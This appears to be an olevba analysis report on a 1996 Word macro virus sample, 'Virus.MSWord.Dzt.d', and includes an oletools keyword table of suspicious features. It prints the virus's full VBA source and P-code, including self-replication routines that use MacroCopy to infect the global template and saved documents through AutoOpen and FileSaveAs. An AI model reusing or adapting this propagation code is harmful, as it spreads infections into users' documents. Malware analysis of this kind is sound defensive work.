olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Dzt.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Dzt.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Dzt.d - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim Filebaru$, FileMacro$
Dim salah

                                                          Long   , "ÀÀ£ÚÀÀÀÀšÀÀÀÁÀÊÀÀÀÂÀÊÀÀÀÃÀÁÀÀÀÄÀÀÀÀÅÀÀÀÀÀÀÀÀÀÚÀÀÀÜÀÀÀÝÀÀÀMÂÀÀNÂÀÀÂÀÀÂÀÀÂÀÀÂÀÀÂÀÀÂÀÀ‹ÃÀÀŒÃÀÀ~ÃÀÀÃÀÀàÄÀÀ™ÄÀÀÄÀÀÄÀÀÕÅÀÀÖÅÀÀ«ÅÀÀ¬ÅÀÀ­ÅÀÀÅÀÀ\x08ÅÀÀ  ÅÀÀÅÀÀÅÀÀÅÀÀ
ÆÀÀ
ÆÀÀsÇÀÀtÇÀÀvÇÀÀ
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Dzt.d - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim formatfile, salah
Dim Filebaru$

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim Ukuran$
Dim Rev$
Dim Ls$
formatfile = 0
salah = 0
Filebaru$ = ""
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics dlg
Ukuran$ = UCase(dlg.FileSize)
Rev$ = dlg.Revision
Ls$ = dlg.LastSaved
If (Ukuran$ = "0 BYTES") Or (Rev$ = "1") Or (Ls$ = "") Then SaveTo
If (Ukuran$ <> "0 BYTES") Or (Rev$ <> "1") Or (Ls$ <> "") Then SaveFile -1
finish:
If Err.Number = 509 Then SaveTo
End Sub

Private Sub SaveTo()
Dim fileFormat
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
formatfile = dlg.Format
Filebaru$ = dlg.Name
WordBasic.FileSaveAs dlg
finish:
If ((Err.Number = 0) And (fileFormat < 2)) Then SaveFile (0)
End Sub

Private Sub SaveFile(cek)
On Error GoTo -1: On Error GoTo finish
If cek Then
    Filebaru$ = WordBasic.[FileName$]()
    CekFormat
End If
If formatfile = 1 Then CopyToFile
If formatfile = 0 Then
    WordBasic.FileSaveAs Name:=Filebaru$, Format:=1
    CopyToFile
End If
finish:
If salah = 0 Then
    Aksi
    WordBasic.FileSave
End If
End Sub

Private Sub CekFormat()
On Error GoTo -1: On Error GoTo finish
Dim dlog As Object: Set dlog = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlog
formatfile = dlog.Format
finish:
If Err.Number <> 0 Then formatfile = Err.Number
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyFSAF
End If
If salah <> 0 Then
    CopyFSG
    CopyFSAG
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyFSG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyFSAG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":FileSaveAs", "Global:FileSaveAs", 1
finish:
End Sub

Private Sub CopyFSAF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSaveAs", Filebaru$ + ":FileSaveAs", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT'96" + Chr(13) + "(c)9 April 1996 by Hikmat S/D0E94328" + Chr(13) + "comp. dept. of HFT" + Chr(13) + "Instrumentasi Elektronika" + Chr(13) + "MIPA Terapan Fakultas MIPA" + Chr(13) + "Universitas Padjadjaran" + Chr(13) + "Bandung"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: ./Virus.MSWord.Dzt.d - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Dzt.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 1359 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn Filebaru
' 	VarDefn FileMacro
' Line #2:
' 	Dim 
' 	VarDefn salah
' Line #3:
' Line #4:
' 	Reparse 0x00FF "                                                          Long   , "ÀÀ£ÚÀÀÀÀšÀÀÀÁÀÊÀÀÀÂÀÊÀÀÀÃÀÁÀÀÀÄÀÀÀÀÅÀÀÀÀÀÀÀÀÀÚÀÀÀÜÀÀÀÝÀÀÀMÂÀÀNÂÀÀÂÀÀÂÀÀÂÀÀÂÀÀÂÀÀÂÀÀ‹ÃÀÀŒÃÀÀ~ÃÀÀÃÀÀàÄÀÀ™ÄÀÀÄÀÀÄÀÀÕÅÀÀÖÅÀÀ«ÅÀÀ¬ÅÀÀ­ÅÀÀÅÀÀ\x08ÅÀÀ  ÅÀÀÅÀÀÅÀÀÅÀÀ
' ÆÀÀ
' ÆÀÀsÇÀÀtÇÀÀvÇÀÀ"
' Line #5:
' 	Label finish 
' Line #6:
' 	EndSub 
' Macros/VBA/FileSave - 6133 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn formatfile
' 	VarDefn salah
' Line #2:
' 	Dim 
' 	VarDefn Filebaru
' Line #3:
' Line #4:
' 	FuncDefn (Public Sub MAIN())
' Line #5:
' 	Dim 
' 	VarDefn Ukuran
' Line #6:
' 	Dim 
' 	VarDefn Rev
' Line #7:
' 	Dim 
' 	VarDefn Ls
' Line #8:
' 	LitDI2 0x0000 
' 	St formatfile 
' Line #9:
' 	LitDI2 0x0000 
' 	St salah 
' Line #10:
' 	LitStr 0x0000 ""
' 	St Filebaru$ 
' Line #11:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #12:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #13:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #14:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd DocumentStatistics 0x0001 
' 	Set dlg 
' Line #15:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall DocumentStatistics 0x0001 
' Line #16:
' 	Ld dlg 
' 	MemLd FileSize 
' 	ArgsLd UCase 0x0001 
' 	St Ukuran$ 
' Line #17:
' 	Ld dlg 
' 	MemLd Revision 
' 	St Rev$ 
' Line #18:
' 	Ld dlg 
' 	MemLd LastSaved 
' 	St Ls$ 
' Line #19:
' 	Ld Ukuran$ 
' 	LitStr 0x0007 "0 BYTES"
' 	Eq 
' 	Paren 
' 	Ld Rev$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld Ls$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ArgsCall SaveTo 0x0000 
' 	EndIf 
' Line #20:
' 	Ld Ukuran$ 
' 	LitStr 0x0007 "0 BYTES"
' 	Ne 
' 	Paren 
' 	Ld Rev$ 
' 	LitStr 0x0001 "1"
' 	Ne 
' 	Paren 
' 	Or 
' 	Ld Ls$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SaveFile 0x0001 
' 	EndIf 
' Line #21:
' 	Label finish 
' Line #22:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x01FD 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall SaveTo 0x0000 
' 	EndIf 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Private Sub SaveTo())
' Line #26:
' 	Dim 
' 	VarDefn fileFormat
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #28:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #29:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #30:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #31:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #32:
' 	Ld dlg 
' 	MemLd Format$ 
' 	St formatfile 
' Line #33:
' 	Ld dlg 
' 	MemLd New 
' 	St Filebaru$ 
' Line #34:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #35:
' 	Label finish 
' Line #36:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld fileFormat 
' 	LitDI2 0x0002 
' 	Lt 
' 	Paren 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	Paren 
' 	ArgsCall SaveFile 0x0001 
' 	EndIf 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Private Sub SaveFile(cek))
' Line #40:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #41:
' 	Ld cek 
' 	IfBlock 
' Line #42:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Filebaru$ 
' Line #43:
' 	ArgsCall CekFormat 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld formatfile 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CopyToFile 0x0000 
' 	EndIf 
' Line #46:
' 	Ld formatfile 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld Filebaru$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #48:
' 	ArgsCall CopyToFile 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Label finish 
' Line #51:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	ArgsCall Aksi 0x0000 
' Line #53:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Private Sub CekFormat())
' Line #58:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #59:
' 	Dim 
' 	VarDefn dlog (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlog 
' Line #60:
' 	Ld dlog 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #61:
' 	Ld dlog 
' 	MemLd Format$ 
' 	St formatfile 
' Line #62:
' 	Label finish 
' Line #63:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Err 
' 	MemLd Number 
' 	St formatfile 
' 	EndIf 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Private Sub CopyToFile())
' Line #67:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #68:
' 	ArgsCall CekCopyToFile 0x0000 
' Line #69:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #70:
' 	ArgsCall CopyFSAF 0x0000 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld salah 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #73:
' 	ArgsCall CopyFSG 0x0000 
' Line #74:
' 	ArgsCall CopyFSAG 0x0000 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Label finish 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	FuncDefn (Private Sub CekCopyToFile())
' Line #80:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError fin 
' Line #81:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #82:
' 	Label fin 
' Line #83:
' 	Ld Err 
' 	MemLd Number 
' 	St salah 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	FuncDefn (Private Sub CopyFSG())
' Line #87:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #88:
' 	Ld Filebaru$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #89:
' 	Label finish 
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
' 	FuncDefn (Private Sub CopyFSAG())
' Line #93:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #94:
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #95:
' 	Label finish 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Private Sub CopyFSAF())
' Line #99:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #100:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld Filebaru$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #101:
' 	Label finish 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Private Sub Aksi())
' Line #105:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError finish 
' Line #106:
' 	LitStr 0x0006 "DZT'96"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0024 "(c)9 April 1996 by Hikmat S/D0E94328"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "comp. dept. of HFT"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 "Instrumentasi Elektronika"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "MIPA Terapan Fakultas MIPA"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "Universitas Padjadjaran"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Bandung"
' 	Add 
' 	ParamNamed Comments 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #107:
' 	Label finish 
' Line #108:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

